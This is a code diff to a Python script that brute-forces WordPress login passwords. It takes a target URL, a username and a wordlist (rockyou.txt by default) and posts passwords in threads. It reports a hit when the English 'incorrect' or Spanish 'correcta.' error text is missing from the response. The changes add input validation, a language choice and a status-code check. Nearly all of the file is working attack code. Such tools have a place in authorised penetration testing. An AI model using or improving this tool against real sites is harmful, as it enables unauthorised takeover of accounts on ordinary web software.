@@ -35,33 +35,72 @@ banner()
 
 print("\n" + colors.GREEN + "-"*80 + "\n" + colors.END)
 
-url = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL" + colors.PURPLE + " ~> " + colors.END))
-user = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the username" + colors.PURPLE + " ~> " + colors.END))
+while True:
+	url = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL" + colors.PURPLE + " ~> " + colors.END).rstrip("\n"))
 
-n_t = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "How many threads do you want to use?" + colors.PURPLE + " ~> " + colors.END))
+	if len(url.rstrip()) < 1:
+		print(colors.RED + "\n[!] Invalid URL\n" + colors.END)
 
-if int(n_t) < 1:
-	n_t = 1
+	else:
+		break
 
-elif int(n_t) > 50:
-	time.sleep(0.3)
-	print(colors.RED + "-"*54 + colors.END + "\n")
-	log.warning("Using too many threads could give false positives\n\n")
-	print(colors.RED + "-"*54)
-	time.sleep(1)
+while True:
+	language = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL page language " + colors.PURPLE + "[" + colors.GRAY + "en/es" + colors.PURPLE + "] ~> " + colors.END).strip())
 
-WDictionary = input(str(colors.PURPLE + "█ " + colors.GRAY + "Do you want to use your own wordlist? " + colors.PURPLE + "[" + colors.GRAY + "Y/N" + colors.PURPLE + "] ~> " + colors.END))
+	if len(language.rstrip()) < 2 or len(language.rstrip()) > 2 or language.rstrip("\n").lower() != 'en' and language.rstrip("\n").lower() != 'es':
+		print(colors.RED + "\n[!] Invalid language\n" + colors.END)
 
-if WDictionary.upper().rstrip("\n") == 'Y':
+	else:
+		break
+
+while True:
+	user = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Enter the username" + colors.PURPLE + " ~> " + colors.END).rstrip("\n"))
+
+	if len(user.rstrip()) < 1:
+		print(colors.RED + "\n[!] Invalid username" + colors.END)
+
+	else:
+		break
+
+while True:
+	n_t = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "How many threads do you want to use?" + colors.PURPLE + " ~> " + colors.END))
+
 	try:
-		wordlist = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Enter the wordlist path" + colors.PURPLE + " ~> " + colors.END))
-		dictionary = open(wordlist.rstrip("\n"), 'r')
-	except:
-		print(colors.RED + "\n[!] Invalid path" + colors.END)
-		sys.exit(1)
+		if int(n_t) < 1:
+			n_t = 1
+			break
 
-elif WDictionary.upper().rstrip("\n") == 'N':
-	dictionary = open("/usr/share/wordlists/rockyou.txt", 'r')
+		elif int(n_t) > 50:
+			time.sleep(0.3)
+			print(colors.RED + "-"*54 + colors.END + "\n")
+			log.warning("Using too many threads could give false positives\n\n")
+			print(colors.RED + "-"*54)
+			time.sleep(1)
+			break
+
+		else:
+			break
+
+	except:
+		print(colors.RED + "\n[!] Invalid number" + colors.END)
+
+while True:
+	WDictionary = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Do you want to use your own wordlist? " + colors.PURPLE + "[" + colors.GRAY + "Y/N" + colors.PURPLE + "] ~> " + colors.END))
+
+	if WDictionary.upper().rstrip("\n") == 'Y':
+		try:
+			wordlist = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "Enter the wordlist path" + colors.PURPLE + " ~> " + colors.END))
+			dictionary = open(wordlist.rstrip("\n"), 'r')
+			break
+		except:
+			print(colors.RED + "\n[!] Invalid path" + colors.END)
+
+	elif WDictionary.upper().rstrip("\n") == 'N':
+		dictionary = open("/usr/share/wordlists/rockyou.txt", 'r')
+		break
+
+	else:
+		print(colors.RED + "\n[!] Invalid option" + colors.END)
 
 print("\n" + colors.PURPLE + "-"*80 + "\n" + colors.END)
 
@@ -69,6 +108,7 @@ p2 = log.info("Bruteforcing %s" % user)
 p1 = log.progress("Password")
 
 def makeRequest():
+
 	cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}
 
 	for i in dictionary:
@@ -81,10 +121,8 @@ def makeRequest():
 
 		r = requests.post(url.rstrip("\n"), data=data, cookies=cookie)
 
-		p1.status("%s" % i)
-
-		if "incorrect" not in r.text:
-			p1.success("%s" % i)
+		if r.status_code != 200:
+			print(colors.RED + "\n[!] Invalid url or you don\'t have connecion" + colors.END)
 
 			if threading.activeCount() > 1:
 				os.system("tput cnorm")
@@ -93,6 +131,29 @@ def makeRequest():
 				os.system("tput cnorm")
 				sys.exit(getattr(os, "_exitcode", 0))
 
+		p1.status("%s" % i)
+
+		if language.lower().rstrip("\n") == "en":
+			if "incorrect" not in r.text:
+				p1.success("%s" % i)
+
+				if threading.activeCount() > 1:
+					os.system("tput cnorm")
+					os._exit(getattr(os, "_exitcode", 0))
+				else:
+					os.system("tput cnorm")
+					sys.exit(getattr(os, "_exitcode", 0))
+
+		if language.lower().rstrip("\n") ==  "es":
+			if "correcta." not in r.text:
+				p1.success("%s" % i)
+
+				if threading.activeCount() > 1:
+					os.system("tput cnorm")
+					os._exit(getattr(os, "_exitcode", 0))
+				else:
+					os.system("tput cnorm")
+					sys.exit(getattr(os, "_exitcode", 0))
 
 if __name__ == '__main__':
 
